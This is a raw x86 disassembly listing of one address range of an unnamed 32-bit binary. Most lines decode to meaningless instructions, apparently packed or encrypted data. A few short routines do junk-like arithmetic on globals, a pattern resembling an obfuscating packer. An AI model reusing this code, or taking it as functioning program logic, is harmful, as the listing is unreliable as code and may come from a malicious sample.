  406181:	jo     0x4061f6
  406183:	sub    al,0x1b
  406185:	push   edi
  406186:	pop    esp
  406187:	pop    edx
  406188:	test   eax,0x2a475a1c
  40618d:	rol    DWORD PTR [edx+0x45],0x35
  406191:	inc    ecx
  406192:	cld    
  406193:	mov    ecx,0x65246934
  406198:	add    BYTE PTR [ecx-0x22a132df],ah
  40619e:	dec    edi
  40619f:	pop    edi
  4061a0:	ins    DWORD PTR es:[edi],dx
  4061a1:	xor    DWORD PTR [edx-0x5ea23c6e],ecx
  4061a7:	out    0x8b,eax
  4061a9:	jne    0x40619c
  4061ab:	or     ah,BYTE PTR [ebx-0x19]
  4061ae:	pop    edi
  4061af:	out    0x86,eax
  4061b1:	sub    al,BYTE PTR [ebx-0x52]
  4061b4:	ss dec edi
  4061b6:	fst    DWORD PTR [ecx+0x59033f08]
  4061bc:	inc    ebp
  4061bd:	enter  0xdb6c,0x20
  4061c1:	and    cl,BYTE PTR [esi+0x50]
  4061c4:	push   ss
  4061c5:	inc    ebx
  4061c6:	and    cl,BYTE PTR [ebx+eiz*8-0x15a2ca2d]
  4061cd:	add    edx,ebx
  4061cf:	cmc    
  4061d0:	jecxz  0x406214
  4061d2:	cmc    
  4061d3:	cmp    al,0x21
  4061d5:	lock popa 
  4061d7:	pop    ebx
  4061d8:	jecxz  0x406259
  4061da:	cli    
  4061db:	jmp    0x4061a3
  4061dd:	push   es
  4061de:	test   eax,esp
  4061e0:	dec    edi
  4061e1:	sbb    eax,0x41e2459e
  4061e6:	and    ecx,DWORD PTR [ebp+0x212ac600]
  4061ec:	in     eax,dx
  4061ed:	adc    eax,0x2f129984
  4061f2:	mov    edx,0xecd17ef
  4061f7:	pop    ecx
  4061f8:	pop    ebx
  4061f9:	mov    DWORD PTR [edi-0xc],esp
  4061fc:	mov    eax,ds:0xf47ae8ee
  406201:	push   0xac4bd9be
  406206:	out    0x7a,eax
  406208:	call   0x3bbcc52a
  40620d:	pop    ds
  40620e:	jmp    DWORD PTR ds:0x94d01982
  406214:	cmc    
  406215:	pop    ds
  406216:	mov    WORD PTR [edi],gs
  406218:	jb     0x4061b1
  40621a:	(bad)
  40621e:	dec    edx
  40621f:	daa    
  406220:	das    
  406221:	mov    dl,0x33
  406223:	in     eax,dx
  406224:	push   ebx
  406225:	mov    ah,0xe9
  406227:	xchg   esp,eax
  406228:	jmp    DWORD PTR [eax]
  40622a:	cmp    al,0x52
  40622c:	adc    eax,DWORD PTR ds:0xbea3990f
  406232:	test   DWORD PTR ds:0xc25b6f5c,edx
  406238:	mov    al,ds:0x909aa97a
  40623d:	adc    eax,0xdf81d868
  406242:	mov    bh,0x66
  406244:	loop   0x4061c8
  406246:	inc    ebp
  406247:	loopne 0x40626a
  406249:	popf   
  40624a:	and    DWORD PTR [esi+0x322d3c76],ebx
  406250:	or     BYTE PTR [ebx+0x7f49ad87],cl
  406256:	mov    edx,0x899db8fa
  40625b:	in     al,0x75
  40625d:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40625f:	mov    ebp,0xf4aa19cf
  406264:	rol    DWORD PTR [esi+0x40],cl
  406267:	and    BYTE PTR [esi-0x49],dh
  40626a:	add    ch,BYTE PTR [edx+0x46fcb6ec]
  406270:	or     al,0x72
  406272:	(bad)  
  406273:	jg     0x406252
  406275:	push   es
  406276:	xor    cl,bh
  406278:	fisub  DWORD PTR [ebp-0x60380804]
  40627e:	js     0x406265
  406280:	pmaxub mm5,mm1
  406283:	std    
  406284:	dec    edi
  406285:	xor    esp,DWORD PTR [ebp-0x2d504b3d]
  40628b:	fisttp QWORD PTR [eax]
  40628d:	add    cl,BYTE PTR [ebx+0x758b1845]
  406293:	adc    BYTE PTR [ecx+0x42fd092d],al
  406299:	add    BYTE PTR [esi-0x76ffbd03],al
  40629f:	inc    esi
  4062a0:	or     al,0x9
  4062a2:	or     eax,0x42e6f3
  4062a7:	mov    eax,DWORD PTR [ebp+0x1c]
  4062aa:	mov    DWORD PTR ds:0x42fd72,0x1e
  4062b4:	cmp    DWORD PTR ds:0x42fd72,0x0
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fd72,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e53b
  4062e2:	cmp    DWORD PTR ds:0x42fd72,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fd72
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fd72,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fd72
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fd72,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	adc    al,0xf
  406330:	js     0x406300
  406332:	mov    WORD PTR [eax+esi*2],?
  406335:	jo     0x4062de
  406337:	jg     0x4063a9
  406339:	jo     0x406329
  40633b:	jg     0x40635b
  40633d:	mov    ecx,0x571fe6b
  406342:	sahf   
  406343:	test   DWORD PTR [ecx],0x16d98365
  406349:	jmp    0xe9c3:0xa1025d78
  406350:	push   cs
  406351:	lock pop ss
  406353:	xor    DWORD PTR [esi+ebp*4-0x1f752f5e],esi
  40635a:	sbb    edi,DWORD PTR [edx-0x6e00c7d5]
  406360:	jmp    0xa8e5:0xb54bba1c
  406367:	loop   0x406340
  406369:	iret   
  40636a:	fdivr  QWORD PTR [ebp+0x48]
  40636d:	test   BYTE PTR [eax],dh
  40636f:	jmp    0x4063e2
  406371:	(bad)  
  406372:	shr    ecx,cl
  406374:	sar    DWORD PTR [esi+edi*1+0x1d],1
  406378:	icebp  
  406379:	int    0x3d
  40637b:	outs   dx,DWORD PTR ds:[esi]
  40637c:	mov    edi,0xdf16cacb
  406381:	mov    al,0x8e
  406383:	xchg   BYTE PTR [bp+si],ch
  406386:	push   0xfffffffc
  406388:	pop    ss
  406389:	into   
  40638a:	fisttp WORD PTR [edx]
  40638c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40638d:	(bad)  
  40638e:	fild   WORD PTR [esi-0x77c7290d]
  406394:	(bad)  
  406395:	loope  0x4063e9
  406397:	push   ds
  406398:	mov    bh,0x2b
  40639a:	xor    al,0x49
  40639c:	sahf   
  40639d:	pop    edx
  40639e:	ins    DWORD PTR es:[edi],dx
  40639f:	cs adc eax,0xf941eb77
  4063a5:	jbe    0x4063f2
  4063a7:	addr16 add eax,0xba3a3cd9
  4063ad:	js     0x40634d
  4063af:	and    eax,0xa032df19
  4063b4:	sub    al,0x7c
  4063b6:	retf   0x6860
  4063b9:	sbb    al,0xd9
  4063bb:	dec    esi
  4063bc:	xchg   ebx,eax
  4063bd:	shr    al,0x97
  4063c0:	adc    BYTE PTR [edx-0x74c8f11c],bl
  4063c6:	loopne 0x40639b
  4063c8:	(bad)  
  4063c9:	outs   dx,BYTE PTR ds:[esi]
  4063ca:	inc    ebx
  4063cb:	out    dx,al
  4063cc:	ins    DWORD PTR es:[edi],dx
  4063cd:	sbb    DWORD PTR ss:[ebx+eiz*2],0x6e
  4063d2:	add    al,0x2b
  4063d4:	xor    DWORD PTR [edx+eiz*8],ebx
  4063d7:	out    0xfb,al
  4063d9:	adc    ch,BYTE PTR [edx]
  4063db:	jecxz  0x406399
  4063dd:	jecxz  0x4063c3
  4063df:	outs   dx,DWORD PTR ds:[esi]
  4063e0:	ret    
  4063e1:	push   es
  4063e2:	stc    
  4063e3:	pop    edx
  4063e4:	jns    0x406401
  4063e6:	mov    esi,0xade7f49e
  4063eb:	adc    edx,DWORD PTR [eax+0x4b]
  4063ee:	fcom   QWORD PTR [esi+0x54]
  4063f1:	pop    ss
  4063f2:	jmp    0x22a8:0x2b68deb7
  4063f9:	or     dh,ah
  4063fb:	add    dh,BYTE PTR [esi+0x75736bb5]
  406401:	lds    ebx,FWORD PTR [ebx]
  406403:	and    al,BYTE PTR [esi+0x71]
  406406:	lods   al,BYTE PTR ds:[esi]
  406407:	icebp  
  406408:	mov    WORD PTR [esi-0x3ccd8df7],ds
  40640e:	jmp    0x406437
  406410:	in     eax,dx
  406411:	xchg   esi,eax
  406412:	push   ebx
  406413:	sub    cl,cl
  406415:	test   eax,0x56710d86
  40641a:	ds sbb ax,0x2145
  40641f:	inc    eax
  406420:	mov    esp,0x56c6a01c
  406425:	add    al,0xd2
  406427:	sbb    eax,0xd51b2e5d
  40642c:	push   esp
  40642d:	(bad)  
  40642e:	sar    BYTE PTR [ecx+0x39],cl
  406431:	imul   ecx
  406433:	inc    ebx
  406434:	loop   0x4063ea
  406436:	push   edi
  406437:	xor    DWORD PTR [ebp-0xcb9e088],ebp
  40643d:	and    al,0x3a
  40643f:	inc    eax
  406440:	adc    bh,dh
  406442:	ins    BYTE PTR es:[edi],dx
  406443:	test   eax,0x63bad39c
  406448:	bound  eax,QWORD PTR [ebx-0x2a]
  40644b:	push   ebx
  40644c:	push   ss
  40644d:	es dec edi
  40644f:	adc    dh,cl
  406451:	mov    WORD PTR [esi+eax*8+0x64b19cdf],?
  406458:	mov    DWORD PTR [ebx+0x13],ebp
  40645b:	inc    eax
  40645c:	mov    ds:0xa140af38,eax
  406461:	and    ch,BYTE PTR ds:0xd4f537f0
  406467:	push   ebx
  406468:	push   0x65cd46fe
  40646d:	add    al,0x74
  40646f:	mul    BYTE PTR [edx-0x93009e]
  406475:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406476:	daa    
  406477:	sti    
  406478:	fdivr  QWORD PTR [esi+eax*8+0x1f]
  40647c:	sub    BYTE PTR ds:0x9d303e71,0x3d
  406483:	ins    DWORD PTR es:[edi],dx
  406484:	(bad)  
  406485:	mov    ebx,0xc52dda83
  40648a:	inc    ebx
  40648b:	push   0x1ca5d3b3
  406490:	fsubr  DWORD PTR [eax+eax*2]
  406493:	push   eax
  406494:	jmp    0x478b77f4
  406499:	mov    DWORD PTR [ecx+0x73],edi
  40649c:	sub    DWORD PTR [edx-0x42cc880e],ebx
  4064a2:	push   0x68c5b94f
  4064a7:	mov    ds:0x91cb14e4,eax
  4064ac:	ret    
  4064ad:	stos   DWORD PTR es:[edi],eax
  4064ae:	in     al,0x5a
  4064b0:	cmp    ch,BYTE PTR ss:[esi]
  4064b3:	or     al,0xc
  4064b5:	test   eax,0x466a942c
  4064ba:	cmp    cl,BYTE PTR [edi]
  4064bc:	(bad)  
  4064be:	jge    0x4064cf
  4064c0:	mov    DWORD PTR [ecx-0x63],edi
  4064c3:	ss and edx,ebx
  4064c6:	nop
  4064c7:	data16 fiadd WORD PTR [edx-0x9]
  4064cb:	out    0x79,eax
  4064cd:	test   esp,ebp
  4064cf:	add    al,0x1f
  4064d1:	mul    DWORD PTR [edi-0x355fdc47]
  4064d7:	sub    BYTE PTR [ebp+eiz*4-0x72],dl
  4064db:	std    
  4064dc:	leave  
  4064dd:	stos   BYTE PTR es:[edi],al
  4064de:	fadd   DWORD PTR [ecx]
  4064e0:	cwde   
  4064e1:	push   esi
  4064e2:	fstp   QWORD PTR [esi-0x37]
  4064e5:	ret    0x18
  4064e8:	push   ebp
  4064e9:	mov    ebp,esp
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fd76,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fcf9
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fd72,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fd72,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fcd9,0x42e6fb
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	and    al,0x74
  406568:	jmp    0xe270:0x703a339f
  40656f:	jle    0x4065e1
  406571:	jo     0x4065ca
  406573:	call   0xfe42fb5c
  406578:	inc    ecx
  406579:	xlat   BYTE PTR ds:[ebx]
  40657a:	sub    ebp,DWORD PTR ds:0x485eaa6
  406580:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406581:	popa   
  406582:	adc    cl,BYTE PTR [ebx-0x4e]
  406585:	icebp  
  406586:	dec    ecx
  406587:	jle    0x4065a1
  406589:	push   ebx
  40658a:	(bad)  
  40658b:	push   ecx
  40658c:	lea    esp,[ebp-0xf]
  40658f:	(bad)  
  406590:	fsub   st,st(3)
  406592:	ss mov edi,0x297c702d
  406598:	and    bh,BYTE PTR [ebx+0x2]
  40659b:	stos   BYTE PTR es:[edi],al
  40659c:	shl    bl,1
  40659e:	sbb    al,0x6d
  4065a0:	push   cs
  4065a1:	iret   
  4065a2:	ins    DWORD PTR es:[edi],dx
  4065a3:	mov    edx,?
  4065a5:	sti    
  4065a6:	ins    DWORD PTR es:[edi],dx
  4065a7:	retf   
  4065a8:	ins    BYTE PTR es:[edi],dx
  4065a9:	mov    edx,0x2d66dafa
  4065ae:	xchg   esi,eax
  4065af:	jmp    0x4065ec
  4065b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065b2:	fiadd  DWORD PTR [esi]
  4065b4:	fsubrp st(7),st
  4065b6:	push   ebx
  4065b7:	std    
  4065b8:	out    dx,al
  4065b9:	mov    al,ds:0x21679951
  4065be:	mov    ah,0xd4
  4065c0:	push   cs
  4065c1:	data16 ds jl 0x40657f
  4065c5:	and    eax,DWORD PTR [edx-0x1de6f7de]
  4065cb:	xchg   esi,eax
  4065cc:	iret   
  4065cd:	inc    esp
  4065ce:	addr16 dec esi
  4065d0:	nop
  4065d1:	psubusw mm4,QWORD PTR [ecx-0x3c]
  4065d5:	nop
  4065d6:	xchg   esi,eax
  4065d7:	or     al,0x9c
  4065d9:	adc    BYTE PTR [edx-0x69156eb],bh
  4065df:	(bad)  
  4065e0:	leave  
  4065e1:	or     al,0xd
  4065e3:	add    DWORD PTR [eax+0x1156d7c3],eax
  4065e9:	pushf  
  4065ea:	rcl    bl,0x95
  4065ed:	jl     0x406596
  4065ef:	pusha  
  4065f0:	dec    edi
  4065f1:	pop    ebx
  4065f2:	(bad)  
  4065f3:	loopne 0x40666c
  4065f5:	test   BYTE PTR [edi],ch
  4065f7:	mov    dl,0x99
  4065f9:	xor    DWORD PTR [ecx-0x1],esp
  4065fc:	xor    cl,BYTE PTR [eax-0x6be6163e]
  406602:	xchg   edx,eax
  406603:	in     al,dx
  406604:	seto   dl
  406607:	es adc bl,al
  40660a:	std    
  40660b:	repz fwait
  40660d:	lock inc ebx
  40660f:	mov    WORD PTR [esi+0xf2e491d],gs
  406615:	jno    0x4065c8
  406617:	test   BYTE PTR [edi+0x55],dh
  40661a:	leave  
  40661b:	scas   eax,DWORD PTR es:[edi]
  40661c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40661d:	js     0x406690
  40661f:	pop    es
  406620:	out    0xa5,eax
  406622:	int    0x4e
  406624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406625:	clc    
  406626:	ins    DWORD PTR es:[edi],dx
  406627:	out    0x39,al
  406629:	(bad)  [esi+eax*2]
  40662c:	dec    esp
  40662d:	lds    esp,FWORD PTR [esi-0x3071c95]
  406633:	cmc    
  406634:	xchg   BYTE PTR ds:0x319a05fc,dl
  40663a:	retf   
  40663b:	fidivr DWORD PTR [eax+0x2e]
  40663e:	das    
  40663f:	or     cl,BYTE PTR [ebx+ebp*4+0x2273c4cb]
  406646:	ret    
  406647:	cmp    DWORD PTR cs:[edi+0x66],esi
  40664b:	lods   eax,DWORD PTR ds:[esi]
  40664c:	rcl    BYTE PTR [edx],cl
  40664e:	sar    cl,0xa4
  406651:	push   0xa7fe393
  406656:	pop    ebp
  406657:	pop    ebx
  406658:	stos   DWORD PTR es:[edi],eax
  406659:	sub    DWORD PTR [ebp-0x2d96aad5],eax
  40665f:	mov    edi,0x414132a5
  406664:	out    0xa0,al
  406666:	addr16 mov esi,0xee89e479
  40666c:	ret    
  40666d:	mov    al,ds:0x4f34401f
  406672:	jo     0x40669e
  406674:	xchg   ebp,eax
  406675:	add    al,0x2c
  406677:	jg     0x4066c1
  406679:	add    ecx,edx
  40667b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40667c:	fs out dx,eax
  40667e:	pop    ss
  40667f:	fstp   TBYTE PTR [ebp+0x40]
  406682:	sub    eax,0xe4955fbf
  406687:	xchg   ebp,eax
  406688:	jb     0x406631
  40668a:	nop
  40668b:	fs pushf 
  40668d:	jg     0x4066fd
  40668f:	fucomi st,st(1)
  406691:	(bad)  
  406692:	cdq    
  406693:	push   es
  406694:	adc    DWORD PTR [eax-0x33880ca3],esp
  40669a:	and    DWORD PTR [edx+ebx*1-0x704d8917],edi
  4066a1:	sub    BYTE PTR [esi-0x51a97a05],dh
  4066a7:	lahf   
  4066a8:	lock mov al,ds:0xb7acd5ba
  4066ae:	dec    esp
  4066af:	mov    dh,0xa8
  4066b1:	pop    es
  4066b2:	popf   
  4066b3:	clc    
  4066b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066b6:	mov    ch,0x46
  4066b8:	jmp    0x907ba836
  4066bd:	inc    edx
  4066be:	push   esi
  4066bf:	std    
  4066c0:	push   es
  4066c1:	cmp    ebp,edi
  4066c3:	stc    
  4066c4:	jecxz  0x4066f5
  4066c6:	add    eax,0x197fac03
  4066cb:	mov    ecx,0x916d34da
  4066d0:	mov    al,ds:0x8d4ef73b
  4066d5:	add    BYTE PTR es:[eax+edx*8],al
  4066d9:	xchg   edi,eax
  4066da:	xchg   ebp,eax
  4066db:	inc    edi
  4066dc:	dec    ecx
  4066dd:	push   eax
  4066de:	mov    cl,bl
  4066e0:	push   0x42b3bc40
  4066e5:	in     eax,dx
  4066e6:	loopne 0x4066fb
  4066e8:	push   ebx
  4066e9:	pop    ebx
  4066ea:	cli    
  4066eb:	je     0x406706
  4066ed:	push   ecx
  4066ee:	and    esp,esp
  4066f0:	mov    WORD PTR [ebp+eiz*2-0x69],?
  4066f4:	or     BYTE PTR [ebp+0x468d7503],0x2d
  4066fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066fc:	xor    bh,BYTE PTR [edi]
  4066fe:	sub    al,0xad
  406700:	ds aaa 
  406702:	jp     0x406760
  406704:	jp     0x40671d
  406706:	pop    edx
  406707:	dec    eax
  406708:	sbb    ebx,esp
  40670a:	fnstsw WORD PTR [ebx]
  40670c:	jg     0x40674d
  40670e:	mov    ecx,0x5bc3d177
  406713:	push   edi
  406714:	out    0xf9,al
  406716:	in     al,dx
  406717:	inc    ebp
  406718:	xor    al,0x74
  40671a:	xchg   esp,eax
  40671b:	xchg   ebp,eax
  40671c:	cmp    al,0x99
  40671e:	hlt    
  40671f:	mov    ah,0x21
  406721:	outs   dx,BYTE PTR ds:[esi]
  406722:	xor    BYTE PTR [edx-0x34],dh
  406725:	shl    DWORD PTR [esi+ecx*8+0x1f],0xed
  40672a:	cmp    BYTE PTR [ecx],bh
  40672c:	ret    0x59e5
  40672f:	rsm    
  406731:	xor    al,al
  406733:	ss test al,0xeb
  406736:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406737:	xchg   ecx,eax
  406738:	mov    edx,0xae122345
  40673d:	lods   eax,DWORD PTR ds:[esi]
  40673e:	sbb    bl,0x33
  406741:	ror    DWORD PTR [ebx],cl
  406743:	call   0xb59d:0xff692547
  40674a:	popa   
  40674b:	cwde   
  40674c:	sbb    bl,BYTE PTR [edx+0x13a4ca6]
  406752:	xchg   ecx,eax
  406753:	loope  0x40677b
  406755:	or     DWORD PTR [ebp+0x2141e749],esi
  40675b:	cld    
  40675c:	in     eax,dx
  40675d:	shl    BYTE PTR [ebp+0x5b],cl
  406760:	adc    ah,BYTE PTR [ebx-0x4478d90a]
  406766:	test   al,0xf8
  406768:	ret    0xe2de
  40676b:	fiadd  DWORD PTR [edi+0x1d98ec0c]
  406771:	dec    ebx
  406772:	or     edx,DWORD PTR [bx+di]
  406775:	idiv   BYTE PTR [eax]
  406777:	mov    cl,0x90
  406779:	mov    edi,0xc3a5e4df
  40677e:	leave  
  40677f:	cdq    
  406780:	sbb    DWORD PTR [ebp-0x58d047e0],0xffffffd7
  406787:	stos   BYTE PTR es:[edi],al
  406788:	(bad)
  40678c:	ss (bad) 
  40678e:	sar    esi,1
  406790:	imul   eax,DWORD PTR [edx],0x6519256d
  406796:	cmp    DWORD PTR cs:[edx+0x12],esi
  40679a:	cmp    ecx,DWORD PTR [edx+0x7c45151a]
  4067a0:	mov    ah,0x2e
  4067a2:	mov    ds:0x7505edee,al
  4067a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067a8:	xor    eax,0x12507866
  4067ad:	es pop esp
  4067af:	xor    bh,ch
  4067b1:	pop    ss
  4067b2:	fnstcw WORD PTR [edi+0x43]
  4067b5:	dec    ecx
  4067b6:	inc    esi
  4067b7:	xchg   ecx,eax
  4067b8:	cli    
  4067b9:	jns    0x40678f
  4067bb:	pop    ebx
  4067bc:	sub    BYTE PTR [edi-0x1a],ah
  4067bf:	int3   
  4067c0:	xchg   ch,cl
  4067c2:	sti    
  4067c3:	push   ebx
  4067c4:	cli    
  4067c5:	pusha  
  4067c6:	xor    BYTE PTR [ebx],cl
  4067c8:	dec    ebx
  4067c9:	adc    al,0x1e
  4067cb:	dec    eax
  4067cc:	icebp  
  4067cd:	mov    bh,dl
  4067cf:	push   es
  4067d0:	cld    
  4067d1:	pushf  
  4067d2:	mov    ch,0xd7
  4067d4:	call   0xde8b:0x589e436d
  4067db:	mov    al,ds:0xc733cf41
  4067e0:	mov    edx,DWORD PTR [ebp+0x10]
  4067e3:	mov    DWORD PTR [edx+0x8],eax
  4067e6:	xor    eax,edx
  4067e8:	mov    eax,DWORD PTR [ebp+0x1c]
  4067eb:	mov    edx,DWORD PTR [ebp+0x10]
  4067ee:	adc    DWORD PTR ds:0x42fcd5,0x1a3e
  4067f8:	mov    DWORD PTR [edx+0xc],eax
  4067fb:	mov    eax,DWORD PTR [ebp+0x20]
  4067fe:	or     DWORD PTR ds:0x42e120,0x7513
  406808:	mov    edx,DWORD PTR [ebp+0x10]
  40680b:	sub    DWORD PTR ds:0x42e6fb,0x76c6
  406815:	mov    DWORD PTR [edx+0x10],eax
  406818:	and    DWORD PTR ds:0x42fce5,0x42e713
  406822:	mov    eax,eax
  406824:	mov    eax,DWORD PTR [ebp+0x14]
  406827:	test   eax,eax
  406829:	mov    eax,DWORD PTR [ebp+0x8]
  40682c:	jne    0x406ac0
  406832:	mov    eax,DWORD PTR [ebp+0xc]
  406835:	jmp    0x406ac0
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	pop    ebx
  406847:	cmp    DWORD PTR [ecx+0x7038a5b3],esp
  40684d:	jo     0x406831
  40684f:	jle    0x4068c1
  406851:	jo     0x4068d2
  406853:	jge    0x4068c1
  406855:	enter  0x5e30,0x5b
  406859:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40685a:	lds    edx,FWORD PTR [eax+eiz*4-0x7d]
  40685e:	dec    edx
  40685f:	and    bh,BYTE PTR [ebx]
  406861:	mov    dl,0x26
  406863:	mov    eax,0x6168b3b0
  406868:	pop    ebx
  406869:	retf   0xbdd1
  40686c:	adc    esp,DWORD PTR [edx]
  40686e:	or     edx,esi
  406870:	jmp    0x8ac0b82f
  406875:	bound  eax,QWORD PTR [esi+0x3668dbbc]
  40687b:	jge    0x406875
  40687d:	jmp    0x4068f1
  40687f:	xchg   edx,eax
  406880:	xchg   ecx,eax
  406881:	loope  0x406861
  406883:	inc    esp
  406884:	(bad)  
  406885:	mov    esp,0xdd471f85
  40688a:	sbb    eax,0x385a518d
  40688f:	in     al,0x94
  406891:	or     DWORD PTR [eax],ecx
  406893:	dec    ebx
  406894:	xchg   BYTE PTR [ebx+0x4f],al
  406897:	cmp    eax,DWORD PTR [ecx-0x7b]
  40689a:	mov    bl,BYTE PTR [edx-0x1a]
  40689d:	scas   al,BYTE PTR es:[edi]
  40689e:	int    0xf
  4068a0:	xchg   DWORD PTR [edx+edi*1-0x44823cb4],ecx
  4068a7:	(bad)  
  4068a8:	mov    eax,0xf756f81c
  4068ad:	sbb    dl,BYTE PTR [ebp+0x3f]
  4068b0:	xchg   ebp,eax
  4068b1:	or     eax,0xb4decc59
  4068b6:	loopne 0x4068c2
  4068b8:	jge    0x4068fc
  4068ba:	sti    
  4068bb:	ins    DWORD PTR es:[edi],dx
  4068bc:	push   esi
  4068bd:	sub    DWORD PTR [ecx-0x7d],ecx
  4068c0:	xchg   esp,eax
  4068c1:	add    eax,0xef11529d
  4068c6:	cmp    BYTE PTR [esi],bh
  4068c8:	jecxz  0x406860
  4068ca:	pop    esi
  4068cb:	cli    
  4068cc:	aad    0x38
  4068ce:	xchg   ebp,eax
  4068cf:	mov    edx,0x7cbf92dd
  4068d4:	fistp  DWORD PTR ds:0x770cf471
  4068da:	add    bh,0xd8
  4068dd:	or     esp,ecx
  4068df:	mov    ebx,0xc10768fa
  4068e4:	pop    ebx
  4068e5:	outs   dx,DWORD PTR ds:[esi]
  4068e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068e7:	mov    ds:0x1d62910c,al
  4068ec:	pushf  
  4068ed:	pushf  
  4068ee:	jle    0x4068ee
  4068f0:	stc    
  4068f1:	test   BYTE PTR [ebp-0x2e991a50],dl
  4068f7:	adc    DWORD PTR [edx+0x60e40191],edx
  4068fd:	popa   
  4068fe:	bound  ebx,QWORD PTR [ebp-0x29]
  406901:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406902:	test   DWORD PTR [edi+eax*4],edi
  406905:	mov    edi,0xde4ab4e6
  40690a:	adc    bh,BYTE PTR [esi+0x6f]
  40690d:	dec    ebp
  40690e:	xchg   DWORD PTR [esi-0x19cc084a],ecx
  406914:	mov    dl,0x57
  406916:	(bad)  
  406918:	outs   dx,DWORD PTR ds:[esi]
  406919:	pop    ecx
  40691a:	mov    dl,0xa1
  40691c:	scas   eax,DWORD PTR es:[edi]
  40691d:	mov    esp,0xdfe27063
  406922:	stos   BYTE PTR es:[edi],al
  406923:	loop   0x406959
  406925:	loopne 0x406908
  406927:	pop    esi
  406928:	mov    ds:0xe37914e,al
  40692d:	fidiv  DWORD PTR [ecx]
  40692f:	stos   DWORD PTR es:[edi],eax
  406930:	push   esp
  406931:	mov    edi,ss
  406933:	inc    ecx
  406934:	dec    edi
  406935:	push   esi
  406936:	shl    BYTE PTR [ebx],0x2c
  406939:	mov    bl,0xa9
  40693b:	mov    cl,0x1e
  40693d:	add    al,BYTE PTR ds:0x959e81d
  406943:	(bad)  
  406944:	adc    dh,BYTE PTR [ecx+0x185de76c]
  40694a:	lock dec sp
  40694d:	sub    eax,0x141413a7
  406952:	inc    ebx
  406953:	and    edi,DWORD PTR ds:0x165f15d4
  406959:	icebp  
  40695a:	mov    dh,0x70
  40695c:	int    0x65
  40695e:	int    0xf7
  406960:	jbe    0x406940
  406962:	dec    eax
  406963:	jl     0x40698e
  406965:	cmp    DWORD PTR [edx+0x551119b9],esi
  40696b:	pushf  
  40696c:	jmp    0x406977
  40696e:	loop   0x406941
  406970:	pop    edi
  406971:	popa   
  406972:	mov    esi,gs
  406974:	int    0xa1
  406976:	sbb    eax,0x48440e2
  40697b:	add    DWORD PTR ds:0x12261c2b,ebx
  406981:	aam    0xac
  406983:	fwait
  406984:	dec    edx
  406985:	dec    eax
  406986:	out    0xf6,eax
  406988:	or     al,0x4
  40698a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40698b:	out    0x6c,eax
  40698d:	iret   
  40698e:	adc    eax,0xaa1e6db
  406993:	mov    eax,ds:0xc7a3384c
  406998:	cdq    
  406999:	pop    ebp
  40699a:	push   esi
  40699b:	mov    bl,0x96
  40699d:	(bad)  
  40699e:	repz dec eax
  4069a0:	iret   
  4069a1:	dec    edx
  4069a2:	dec    edx
  4069a3:	or     eax,0xc03d2c29
  4069a8:	or     al,0xd
  4069aa:	pop    ss
